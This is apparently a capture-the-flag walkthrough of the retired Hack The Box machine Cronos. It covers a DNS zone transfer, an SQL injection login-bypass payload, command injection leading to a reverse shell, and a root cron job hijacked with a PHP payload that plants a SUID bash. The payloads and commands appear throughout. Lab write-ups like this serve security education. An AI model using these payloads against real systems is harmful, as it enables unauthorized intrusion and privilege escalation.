Cronos is a retired Medium Linux box on Hack The Box. The foothold comes from a DNS zone transfer that leaks an admin subdomain, an SQL injection authentication bypass on its login page, and command injection in the panel behind it — landing a www-data shell. For privilege escalation I abused a root cron job that executes a www-data-writable Laravel `artisan` file to plant a SUID bash.

---

## Recon

I started reconnaissance with a full TCP scan with version detection and default scripts:

```bash
nmap -sV -sC -oA Cronos -p- --min-rate 1000 10.129.227.211
```

![Nmap scan results](/assets/img/cronos/nmap_scan.png)
_Full TCP scan — SSH, DNS, and Apache._

Three services stand out: SSH on 22, an open **DNS** server on 53, and Apache on 80. Browsing to the web server just returns the default Apache landing page:

![Apache2 Ubuntu default page](/assets/img/cronos/apache2_default.png)

A quick content brute-force on the web root didn't turn up anything useful — just the default `index.html` and a locked-down `server-status`:

```bash
gobuster dir -u http://10.129.227.211 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
```

![Gobuster results](/assets/img/cronos/gobuster_scan.png)

So the web root was a dead end. The open DNS server on port 53 was the more interesting lead.

## Zone transfer

With DNS exposed, I attempted a zone transfer to enumerate hostnames. First I mapped the domain to my target in `/etc/hosts`:

```bash
echo "10.129.227.211    cronos.htb admin.cronos.htb www.cronos.htb ns1.cronos.htb" | sudo tee -a /etc/hosts
```

Then requested the full zone:

```bash
dig axfr @10.129.227.211 cronos.htb
```

![DNS zone transfer](/assets/img/cronos/dig.png)
_The zone transfer leaks the admin subdomain._

The transfer succeeds and leaks the hostnames behind the box — the interesting one being `admin.cronos.htb`. (The zone's A records list the machine's static `10.10.10.13`; I just point my hosts entries at my live instance IP.)

## Foothold

`http://admin.cronos.htb` presents a login form. Viewing the source shows a plain username/password form posting back to itself — no client-side logic, and a good candidate for SQL injection:

![Login page source](/assets/img/cronos/page_source.png)

Rather than hunt for credentials, I tried an authentication-bypass payload — username `admin' or '1'='1` with any password:

```text
Username: admin' or '1'='1
Password: anything
```

That logs straight in, landing on a "Net Tool v0.1" page that runs `ping`/`traceroute` against a host you supply. Anything that shells out to a system command is worth testing for command injection:

```text
8.8.8.8; whoami
```

The command runs, confirming injection. I swapped in a bash reverse shell (URL-encoded through Burp), started a listener, and caught the shell as www-data:

```bash
nc -lvnp 4444
```

![Reverse shell as www-data](/assets/img/cronos/reverse_shell.png)
_Caught a shell as www-data in /var/www/admin._

The user flag lives in `/home/noulis/user.txt`:

![User flag](/assets/img/cronos/user_flag.png)

## Privilege Escalation

With a shell as www-data, I checked scheduled tasks — one of the first things I look at after landing on a Linux host:

```bash
cat /etc/crontab
```

![Root cron job running artisan](/assets/img/cronos/crontab.png)
_Root runs the Laravel artisan file every minute._

Root runs `php /var/www/laravel/artisan` **every minute**. The question is whether I can write that file:

```bash
ls -la /var/www/laravel/artisan
```

```text
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```

It's owned by www-data — I can rewrite it, and root will execute whatever I put there. I backed up the original, then replaced it with a PHP payload that copies bash and sets the SUID bit:

```bash
cp /var/www/laravel/artisan /tmp/artisan.bak
echo '<?php exec("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"); ?>' > /var/www/laravel/artisan
```

After the next cron tick, a root-owned SUID bash appeared in `/tmp`:

```text
-rwsr-sr-x 1 root root 1037528 Sep 30 22:31 /tmp/rootbash
```

Running it with `-p` preserves the effective UID instead of dropping privileges:

```bash
/tmp/rootbash -p
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root)
```

`euid=0` is root. From here I read both flags and restored the original `artisan`:

```bash
cat /root/root.txt
cp /tmp/artisan.bak /var/www/laravel/artisan
```

---

## Takeaways

- An open port 53 is an invitation to attempt a zone transfer — it often leaks virtual hosts that aren't linked anywhere else.
- Always try an authentication-bypass payload on a login form before hunting for credentials.
- After any foothold, enumerate cron. A root-scheduled job that executes a file a lower-privileged user can modify is one of the most common Linux privilege escalations you'll see.
